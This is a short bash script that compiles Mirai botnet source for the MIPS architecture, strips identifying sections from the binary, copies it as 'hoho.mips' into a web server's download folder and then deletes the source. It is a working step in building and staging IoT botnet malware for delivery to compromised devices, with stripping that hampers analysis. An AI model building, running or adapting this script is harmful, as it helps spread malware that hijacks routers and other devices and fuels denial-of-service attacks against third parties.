#!/bin/bash
export PATH=$PATH:/etc/xcompile/mips/bin
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o "$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" "$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

compile_bot mips hoho.mips "-static"
cp hoho.mips /var/www/html/bins
rm -rf bot
echo "honwe"
